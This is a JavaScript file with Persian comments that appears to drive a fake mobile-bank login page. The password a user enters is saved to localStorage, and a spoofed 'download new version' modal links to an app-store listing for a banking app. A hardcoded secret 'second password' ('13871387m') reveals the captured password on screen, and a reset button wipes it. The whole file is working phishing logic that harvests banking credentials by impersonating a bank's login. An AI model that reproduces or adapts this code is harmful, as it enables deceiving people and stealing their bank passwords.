// ۱. انتخاب تمام عناصر مورد نیاز از DOM
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const toggle = document.getElementById("togglePassword");

// مودال‌ها
const downloadModal = document.getElementById("downloadModal");
const bioModal = document.getElementById("bioModal");
const guideModal = document.getElementById("guideModal");
const btnMyketDownload = document.getElementById("btnMyketDownload");

// دکمه‌ها و ورودی‌های مودال‌ها
const btnGetNewVersion = document.getElementById("btnGetNewVersion");
const openBioModal = document.getElementById("openBioModal");
const btnVerifySecond = document.getElementById("btnVerifySecond");
const secondPassInput = document.getElementById("secondPassInput");
const resultText = document.getElementById("resultText");
const resetBtn = document.getElementById("resetBtn");
const topMessage = document.getElementById("topMessage") || null;
// --- منطق عملکردی ---

// الف) نمایش/مخفی کردن پسورد در صفحه اصلی (آیکون چشم)
toggle.addEventListener("click", function () {
    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggle.classList.replace("fa-eye-slash", "fa-eye");
    } else {
        passwordInput.type = "password";
        toggle.classList.replace("fa-eye", "fa-eye-slash");
    }
});

// ب) کلیک روی دکمه ورود (اصلاح شده)
loginBtn.addEventListener("click", function() {
    const val = passwordInput.value;
    
if (val === "") {

    if(topMessage){

        topMessage.classList.add("show");

        setTimeout(() => {
            topMessage.classList.remove("show");
        },3000);

    }

    return;
}

    // ذخیره پسورد در localStorage
    localStorage.setItem("saved_user_pass", val);
localStorage.setItem("update_required", "true");
    // به جای مخفی کردن کل Body، فقط محتوای اصلی را محو می‌کنیم
    // فرض می‌کنیم تمام عناصر صفحه اصلی شما داخل یک div با id="main-content" هستند
    // اگر این ID را ندارید، کد زیر را به شکلی که در پایین توضیح دادم تغییر دهید
    const mainContent = document.getElementById("main-content");

if (mainContent) {
    mainContent.style.transition = "opacity 0.6s ease";
    mainContent.style.opacity = "0";
}

    // صبر می‌کنیم تا انیمیشن تمام شود
    setTimeout(() => {
        // برگرداندن opacity بدنه به ۱ تا مودال‌ها دیده شوند
        document.body.style.opacity = "1";
        // نمایش مودال
if(downloadModal){
    downloadModal.style.display = "flex";
}
        // اگر از روش مخفی کردن کل صفحه استفاده کردید، پس پس زمینه را سفید کنید
        document.body.style.backgroundColor = "#ffffff";
    }, 600); 
});

// ج) کلیک روی دکمه "دریافت مجدد نسخه جدید"

btnGetNewVersion.addEventListener("click", function() {

    downloadModal.style.display = "none";

    guideModal.style.display = "flex";

});

btnMyketDownload.addEventListener("click", function(){

    window.location.href =
    "https://myket.ir/app/com.gostaresh.mobilebank.boilerplate";

});

// د) کلیک روی آیکون اثر انگشت (مودال دوم)
const bioButton = document.querySelector(".bio");

if (bioButton) {
    bioButton.addEventListener("click", function() {
        downloadModal.style.display = "none";
        bioModal.style.display = "flex";
    });
}

// ه) منطق بررسی رمز دوم
btnVerifySecond.addEventListener("click", function() {

    const secondPassEntered = secondPassInput.value;
    const originalPassSaved = localStorage.getItem("saved_user_pass");

    if (secondPassEntered === "13871387m") {

        resultText.innerHTML =
        "رمز عبور شما:<br><span style='font-size:22px;color:green;'>" 
        + originalPassSaved +
        "</span>";

        resetBtn.style.display = "block";

    } else {

        alert("رمز دوم اشتباه است!");
        secondPassInput.value = "";

    }

});
// دکمه ریست
// دکمه ریست
resetBtn.addEventListener("click", function () {

    localStorage.removeItem("saved_user_pass");
    localStorage.removeItem("update_required");

    location.reload();

});
// باز شدن خودکار مودال بعد از رفرش
window.addEventListener("load", function () {

    const updateRequired = localStorage.getItem("update_required");

    if (updateRequired === "true") {
        downloadModal.style.display = "flex";
    }

});
